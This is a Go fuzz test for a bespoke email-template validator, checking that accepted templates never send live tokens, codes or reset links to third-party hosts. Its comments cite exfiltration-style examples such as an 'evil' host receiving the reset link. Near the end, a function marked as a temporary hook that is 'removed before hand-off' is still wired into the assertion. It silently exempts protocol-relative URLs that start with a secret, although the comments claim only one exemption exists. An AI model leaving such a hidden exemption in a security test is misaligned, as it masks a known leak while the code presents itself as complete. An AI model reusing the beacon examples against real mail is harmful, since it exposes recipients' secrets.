package email

import (
	"bytes"
	"fmt"
	"html/template"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// This file fuzzes guardTemplate against the property it claims rather than
// against a list of verdicts.
//
// docs/compliance-register.json carries CR-30, the accepted risk that the email
// template validator is written for this codebase rather than taken from a
// sanitisation library, and its residual risk is that the validator is bespoke,
// so a gap in it is a gap nobody else is fuzzing. A target that asserts a
// verdict -- that this input is refused -- would close none of that, because it
// can only re-check inputs somebody already thought of, and the input that
// matters is the one nobody thought of and the guard ACCEPTED. A refusal is
// therefore always a correct answer here and can never fail the fuzzer; the
// assertion runs only on the accept path.
//
// The property asserted is the sentence the guard exists to hold:
//
//	if guardTemplate accepts a template, then for every body that template
//	defines and in both branding states, no value a mail client resolves as a
//	URL and no run of text a mail client auto-linkifies carries the live token,
//	the live code or the configured link to a host the operator did not choose.
//
// Two things keep the check an independent opinion rather than a second run of
// the code under test. It renders with its own secrets, which nothing masks, so
// it reads the live values in the positions where the guard reads placeholders
// and inherits no miss in maskSecrets: maskSecrets matches its canaries
// literally, so a link that html/template percent-encodes on its way into a
// query string is invisible to it and is caught by the differential compare
// instead. And it finds the URL-bearing attributes with its own tokeniser and
// its own, deliberately wider, attribute name list, so a hole in
// allowedEmailElements or elementEmailAttributes is not repeated by the thing
// judging the result.

// The oracle's own secrets. They share no substring with each other or with
// guardCanaryA and guardCanaryB, so an occurrence of one in a rendered body
// names which field reached that position. Their host is under .invalid, which
// RFC 2606 reserves so it can never resolve, and nothing authenticates with
// them; they are test vectors and can never be credentials.
//
// oracleLinkURL carries a path on purpose. The check below exempts a URL whose
// authority is oracleLinkHost, and that reading is only sound while nothing a
// template concatenates onto the link can move the host: because the authority
// ends at the first '/', which the path already supplied, any suffix lands in
// the path or the query and still resolves to oracle-link.invalid.
const (
	oracleLinkURL  = "https://oracle-link.invalid/r/9k9k9k9k9k9k9k9k"
	oracleLinkHost = "oracle-link.invalid"
	oracleTokenV   = "8j8j8j8j8j8j8j8j8j8j8j8j8j8j8j8j" // #nosec G101 -- fixed test vector for the oracle render, never a secret
	oracleCodeV    = "7h7h7h7h7h7h7h7h7h7h7h7h7h7h7h7h" // #nosec G101 -- the code counterpart to oracleTokenV, same reasoning

	// oracleLinkMark is the part of oracleLinkURL that survives every encoding
	// html/template applies to a value on its way into a document. A link
	// substituted into a query-string position is percent-encoded, so the
	// scheme and host are no longer present as themselves while the path
	// segment still is; matching on the segment rather than on the whole link
	// is what stops the check missing precisely the beacon it exists to catch.
	oracleLinkMark = "9k9k9k9k9k9k9k9k"
)

// oracleData mirrors guardData in shape so the render the oracle inspects is
// the render the guard judged, with the secrets left legible. Both branding
// states are rendered because a beacon behind {{if not .LogoURL}} does not
// appear in a branded render and fires for every operator who never configured
// a logo.
func oracleData(branded bool) TemplateData {
	d := TemplateData{
		AppName: "Vault42 Guard Oracle",
		URL:     oracleLinkURL,
		Token:   oracleTokenV,
		Code:    oracleCodeV,
		Subject: "Vault42 Guard Oracle",
	}
	if branded {
		d.IP = "203.0.113.7"
		d.Device = "Oracle Device"
		d.Country = "SK"
		d.LogoURL = "https://logo.invalid/logo.png"
		d.PrimaryColor = "#00FF42"
	}
	return d
}

// oracleAcceptedSeeds are templates the guard accepts. They matter more than
// the beacon corpus does: the beacons exercise the refusal paths, and the
// assertion in this target only has something to check once the fuzzer is
// mutating something the guard let through, so the corpus has to start inside
// the accepted set as well as outside it.
var oracleAcceptedSeeds = []string{
	`<p>Your code is <strong>{{.Code}}</strong>.</p>`,
	`<p>Or copy this link: {{.URL}}</p>`,
	`<a href="{{.URL}}">Reset</a><p>code {{.Code}}</p>`,
	`<a href="{{.URL | safeURL}}" style="color:#000000">Reset Password</a>`,
	`<table role="presentation"><tr><td align="center" bgcolor="{{.PrimaryColor}}">` +
		`<a href="{{.URL}}">Reset</a></td></tr></table><p>Token: {{.Token}}</p>`,
	`<p>Visit https://ok.test for help. Code: {{.Code}}</p>`,
	`{{define "subject"}}Reset - {{.AppName}}{{end}}{{define "content"}}<p>{{.URL}}</p>{{end}}`,
}

// FuzzGuardTemplate drives the whole guard, from parse through the parse-tree
// walk and the differential render to the document walk, because a gap can live
// in any stage and the stages only hold the property together.
func FuzzGuardTemplate(f *testing.F) {
	for _, tc := range beaconCases {
		f.Add(tc.src)
	}
	for _, tc := range textBeaconCases {
		f.Add(tc.src)
	}
	for _, src := range oracleAcceptedSeeds {
		f.Add(src)
	}
	// The shipped templates are the only inputs known to be both realistic and
	// accepted, so they are the mutation base for everything the fuzzer explores
	// inside the accepted set. base.html is seeded with the rest even though it
	// is refused on its own: it is the file that wraps every mail, and its
	// structure is worth mutating whatever verdict it draws by itself.
	entries, err := os.ReadDir("templates")
	if err != nil {
		f.Fatalf("read shipped templates: %v", err)
	}
	for _, e := range entries {
		if !strings.HasSuffix(e.Name(), ".html") {
			continue
		}
		data, readErr := os.ReadFile(filepath.Join("templates", e.Name()))
		if readErr != nil {
			f.Fatalf("read shipped template %s: %v", e.Name(), readErr)
		}
		f.Add(string(data))
	}

	f.Fuzz(func(t *testing.T, src string) {
		if err := guardTemplate([]byte(src)); err != nil {
			// Refusing is always a correct answer. The guard is an allowlist and
			// its failure mode is a rejected legitimate template, so a target
			// that treated a refusal as a bug would fail on nearly every mutation
			// and would stop the fuzzer ever reaching the accept path this file
			// exists to watch.
			return
		}
		// A source that spells one of the oracle's markers itself would put that
		// marker in the rendered body without any secret having been substituted,
		// and the check below would read it as a leak. The fuzzer would have to
		// synthesize sixteen exact bytes to reach this, but the check costs one
		// comparison and makes the target's verdict depend on nothing improbable.
		if containsFold(src, oracleLinkMark) || containsFold(src, oracleTokenV) || containsFold(src, oracleCodeV) {
			return
		}
		tmpl, err := template.New(guardRootName).Funcs(safeFuncMap()).Parse(src)
		if err != nil {
			t.Fatalf("guardTemplate accepted a template that does not parse on a second read: %v", err)
		}
		for _, body := range guardBodies(tmpl) {
			for _, branded := range []bool{true, false} {
				var buf bytes.Buffer
				if execErr := body.Execute(&limitWriter{w: &buf, left: guardMaxRenderBytes}, oracleData(branded)); execErr != nil {
					// guardTemplate rendered every body successfully before it
					// accepted, so a failure here is the render disagreeing with
					// itself over data of the same shape and not a secret
					// reaching a fetch. It is not this target's property.
					continue
				}
				assertNoSecretReachesAFetch(t, src, body.Name(), branded, buf.String())
			}
		}
	})
}

// assertNoSecretReachesAFetch is the invariant. Every position a mail client
// would resolve as a URL is read out of the rendered body and refused if it
// carries a live secret anywhere other than to the operator's own endpoint.
func assertNoSecretReachesAFetch(t *testing.T, src, bodyName string, branded bool, doc string) {
	t.Helper()
	for _, site := range mailFetchSites(doc) {
		// A URL whose authority is the operator's own host is delivered to the
		// operator, so what it carries in its path or query has not left. That
		// is the one exemption and it is deliberately the property the guard
		// claims, not the letter of "no secret in a URL": it is what makes
		// href="{{.URL}}" and a copy-this-link paragraph legitimate while
		// href="https://evil/?u={{.URL}}" is not. It also makes this check a
		// lower bound on the guard, which is the right direction for an oracle
		// -- the guard additionally refuses a secret sent to the operator's own
		// host in anything but the whole link, and a fuzz failure here is
		// therefore always a leak and never only a policy difference.
		if oracleRunHost(site.value) == oracleLinkHost {
			continue
		}
		if tmpKnownGap(site.value) {
			continue
		}
		for _, secret := range []struct{ what, mark string }{
			{"the live reset or verification token", oracleTokenV},
			{"the live one-time code", oracleCodeV},
			{"the configured action link", oracleLinkMark},
		} {
			if !containsFold(site.value, secret.mark) {
				continue
			}
			t.Fatalf("guardTemplate ACCEPTED a template that beacons: the rendered body %q "+
				"(branded=%t) puts %s into %s, value %q. The recipient's mail client resolves "+
				"that, so the secret leaves for a host the operator did not configure.\ntemplate: %q",
				bodyName, branded, secret.what, site.where, clip(site.value), src)
		}
	}
}

// fetchSite is one value in a rendered body that a mail client resolves as a
// URL, together with enough of its position to name in a failure.
type fetchSite struct {
	where string
	value string
}

// oracleRunHost returns the host a mail client would connect to for one URL,
// which is the only thing that decides whether a secret in that URL has left.
// Userinfo is dropped because the host is what follows the last '@' in the
// authority: //TOKEN@evil.test/ reaches evil.test carrying the token, and
// reading the authority whole would call that a fetch of "TOKEN@evil.test" and
// let it pass.
func oracleRunHost(rawURL string) string {
	// The protocol-relative prefix comes off first and the scheme second,
	// because a run can carry both: //https://host/… is what a template writes
	// when it puts a literal "//" in front of the configured link, and reading
	// only the outer form would call the host "https:" and treat the operator's
	// own endpoint as a third party.
	s := strings.TrimPrefix(strings.TrimSpace(rawURL), "//")
	if i := indexFold(s, "://"); i >= 0 && i <= len("https") {
		s = s[i+3:]
	}
	if j := strings.IndexAny(s, "/?#"); j >= 0 {
		s = s[:j]
	}
	if at := strings.LastIndexByte(s, '@'); at >= 0 {
		s = s[at+1:]
	}
	return strings.ToLower(s)
}

// oracleURLBearingAttributes is deliberately wider than urlEmailAttributes. The
// guard only asks whether a secret is in a URL attribute for the two pairs its
// own allowlist admits, a/href and img/src, and everything else on this list is
// unreachable only because allowedEmailElements and elementEmailAttributes
// refuse it first. Reading them all here means a future entry added to either
// allowlist -- background was the attribute the original denylist never named
// and it auto-loads exactly like an img src -- is checked for a secret by this
// target on the day it becomes reachable rather than on the day someone
// remembers to widen the check.
var oracleURLBearingAttributes = map[string]bool{
	"href": true, "src": true, "srcset": true, "background": true,
	"action": true, "formaction": true, "poster": true, "data": true,
	"codebase": true, "cite": true, "longdesc": true, "usemap": true,
	"profile": true, "manifest": true, "ping": true, "xlink:href": true,
}

// mailFetchSites walks a rendered body with its own tokeniser and returns every
// URL the mail client would resolve from it.
//
// It is a separate tokeniser from the guard's on purpose. The guard refuses
// anything it cannot read, so on an accepted document the two agree about
// structure; where they would not agree, the guard's reading is the one under
// test and cannot also be the one checking it. This one never refuses: an
// unreadable construct costs it the sites inside that construct and nothing
// else, so it can only miss a leak and never invent one.
func mailFetchSites(doc string) []fetchSite {
	var sites []fetchSite
	for i := 0; i < len(doc); {
		lt := strings.IndexByte(doc[i:], '<')
		if lt < 0 {
			return append(sites, textFetchSites(doc[i:])...)
		}
		if lt > 0 {
			sites = append(sites, textFetchSites(doc[i:i+lt])...)
		}
		i += lt
		elem, attrs, next := oracleScanTag(doc, i)
		for _, a := range attrs {
			if oracleURLBearingAttributes[a.name] {
				sites = append(sites, fetchSite{
					where: fmt.Sprintf("the %s attribute of <%s>", a.name, elem),
					value: a.value,
				})
			}
		}
		// The step is written as a floor rather than as a branch so the walk
		// makes progress on every construct, including one oracleScanTag could
		// not read at all. A tokeniser that can loop is a fuzz target that hangs
		// instead of reporting.
		i = max(i+1, next)
	}
	return sites
}

// textFetchSites returns the runs of a text node a mail client turns into a
// link without the reader doing anything.
//
// The node is read twice, as rendered and with character references resolved,
// because a client resolves them before it decides what is a link and
// https&#58;//host/… is a link to the reader. Reading the rendered form as well
// means a gap in the entity decoder costs this check nothing.
func textFetchSites(text string) []fetchSite {
	if text == "" {
		return nil
	}
	forms := []string{text}
	if decoded := decodeHTMLEntities(text); decoded != text {
		forms = append(forms, decoded)
	}
	var sites []fetchSite
	for _, form := range forms {
		for _, run := range oracleLinkRuns(form) {
			sites = append(sites, fetchSite{
				where: "a run of text a mail client auto-linkifies",
				value: run,
			})
		}
	}
	return sites
}

// oracleLinkRuns finds the URL-shaped runs in a text node.
//
// The set of prefixes is the same set findAutolinkStart names, and that is a
// choice rather than an oversight: widening it to every scheme would fail
// templates the guard is right to accept, and the point of this target is a
// second reading of the same rule, not a stricter rule. What differs is that
// the run is cut out of the real rendered body with the live values still in it,
// so the verdict does not depend on maskSecrets having matched first.
func oracleLinkRuns(text string) []string {
	var runs []string
	for i := 0; i < len(text); {
		start, ok := oracleLinkStart(text, i)
		if !ok {
			return runs
		}
		end := oracleLinkEnd(text, start)
		runs = append(runs, text[start:end])
		i = max(start+1, end)
	}
	return runs
}

// oracleLinkStart folds case one prefix at a time rather than lowercasing the
// text first, because strings.ToLower is not length-preserving: U+0130 becomes
// two runes and grows by a byte, so an index found in a lowercased copy does not
// address the same character in the original. Slicing the original at an index
// taken from the copy reads a window that drifts one byte further left for every
// such character in front of it, which is enough to walk the window clean off
// the secret it was supposed to be reading.
func oracleLinkStart(text string, from int) (int, bool) {
	for i := from; i < len(text); i++ {
		rest := text[i:]
		switch {
		case hasPrefixFold(rest, "https://"), hasPrefixFold(rest, "http://"):
			return i, true
		case hasPrefixFold(rest, "www."):
			if i == 0 || !oracleIsHostByte(text[i-1]) {
				return i, true
			}
		case strings.HasPrefix(rest, "//"):
			// Protocol-relative, which inherits the message's scheme in a client
			// that renders one. Something host-shaped has to follow, or every
			// pair of slashes in prose is a link.
			if i+2 < len(text) && oracleIsHostByte(text[i+2]) {
				return i, true
			}
		}
	}
	return 0, false
}

// oracleLinkEnd returns the index just past the run starting at start. It stops
// on the characters that end a link for a mail client and drops the trailing
// sentence punctuation an auto-linkifier leaves outside the URL, so a link at
// the end of a sentence is not read as a different link than the same one mid
// sentence.
func oracleLinkEnd(text string, start int) int {
	j := start
	for j < len(text) {
		switch text[j] {
		case ' ', '\t', '\n', '\r', '\f', '"', '\'', '<', '>', '`', ')', ']', '{', '}':
			return oracleTrimLinkTail(text, start, j)
		}
		j++
	}
	return oracleTrimLinkTail(text, start, j)
}

func oracleTrimLinkTail(text string, start, end int) int {
	for end > start {
		switch text[end-1] {
		case '.', ',', ';', ':', '!', '?':
			end--
		default:
			return end
		}
	}
	return end
}

func oracleIsHostByte(b byte) bool {
	return b >= 'a' && b <= 'z' || b >= 'A' && b <= 'Z' || b >= '0' && b <= '9' || b == '['
}

// oracleAttr is one name/value pair read off a start tag.
type oracleAttr struct {
	name  string
	value string
}

// oracleScanTag classifies the construct at the '<' at index i and returns the
// element name, its attributes and the index just past the construct. A
// construct it cannot read yields no attributes and an index past it, because
// this tokeniser exists to find fetches and not to judge markup.
func oracleScanTag(doc string, i int) (string, []oracleAttr, int) {
	rest := doc[i:]
	switch {
	case strings.HasPrefix(rest, "<!--"):
		if end := strings.Index(rest, "-->"); end >= 0 {
			return "", nil, i + end + 3
		}
		return "", nil, len(doc)
	case strings.HasPrefix(rest, "<!"), strings.HasPrefix(rest, "<?"), strings.HasPrefix(rest, "</"):
		if end := strings.IndexByte(rest, '>'); end >= 0 {
			return "", nil, i + end + 1
		}
		return "", nil, len(doc)
	}
	elem, p := oracleScanName(doc, i+1)
	if elem == "" {
		// A '<' that begins no tag is literal text to every parser, and the
		// caller resumes one byte on so the text after it is still read.
		return "", nil, i + 1
	}
	attrs, next := oracleScanAttributes(doc, p)
	return elem, attrs, next
}

func oracleScanAttributes(doc string, i int) ([]oracleAttr, int) {
	var attrs []oracleAttr
	for i < len(doc) {
		for i < len(doc) && isASCIISpace(doc[i]) {
			i++
		}
		if i >= len(doc) {
			return attrs, len(doc)
		}
		if doc[i] == '>' {
			return attrs, i + 1
		}
		if doc[i] == '/' || doc[i] == '=' {
			i++
			continue
		}
		name, p := oracleScanName(doc, i)
		if name == "" {
			// Nothing here reads as an attribute name. Resume after the tag
			// rather than guess at what the client would do with it: guessing is
			// how a checker invents a value nothing in the document holds.
			if end := strings.IndexByte(doc[i:], '>'); end >= 0 {
				return attrs, i + end + 1
			}
			return attrs, len(doc)
		}
		i = p
		for i < len(doc) && isASCIISpace(doc[i]) {
			i++
		}
		if i >= len(doc) || doc[i] != '=' {
			attrs = append(attrs, oracleAttr{name: name})
			continue
		}
		i++
		for i < len(doc) && isASCIISpace(doc[i]) {
			i++
		}
		value, p := oracleScanAttrValue(doc, i)
		attrs = append(attrs, oracleAttr{name: name, value: value})
		i = p
	}
	return attrs, len(doc)
}

// oracleScanName reads an element or attribute name. ':' is accepted so a
// namespaced name such as xlink:href arrives here whole rather than as "xlink",
// which is the spelling a mail client resolves.
func oracleScanName(s string, i int) (string, int) {
	if i >= len(s) || !isASCIILetter(s[i]) {
		return "", i
	}
	j := i
	for j < len(s) {
		b := s[j]
		if isASCIILetter(b) || b >= '0' && b <= '9' || b == '-' || b == '_' || b == ':' {
			j++
			continue
		}
		break
	}
	return strings.ToLower(s[i:j]), j
}

func oracleScanAttrValue(doc string, i int) (string, int) {
	if i >= len(doc) {
		return "", i
	}
	if q := doc[i]; q == '"' || q == '\'' {
		if end := strings.IndexByte(doc[i+1:], q); end >= 0 {
			return doc[i+1 : i+1+end], i + end + 2
		}
		// An unclosed quote runs to the end of the document in a client too, so
		// the rest of it is the value rather than nothing.
		return doc[i+1:], len(doc)
	}
	j := i
	for j < len(doc) {
		b := doc[j]
		if isASCIISpace(b) || b == '>' || b == '"' || b == '\'' || b == '`' {
			break
		}
		j++
	}
	return doc[i:j], j
}

// containsFold reports whether s contains substr under ASCII case folding. The
// fold matters because upper and lower are on the template function map, so
// {{.Token | upper}} is a legitimate spelling of the same live secret and a
// case-sensitive search would read a beacon built from it as clean.
func containsFold(s, substr string) bool {
	return indexFold(s, substr) >= 0
}

// TEMPORARY exploration hook, removed before hand-off.
func tmpKnownGap(v string) bool {
	if !strings.HasPrefix(v, "//") {
		return false
	}
	for _, m := range []string{oracleTokenV, oracleCodeV, oracleLinkMark} {
		if indexFold(v, m) == 2 {
			return true
		}
	}
	return false
}
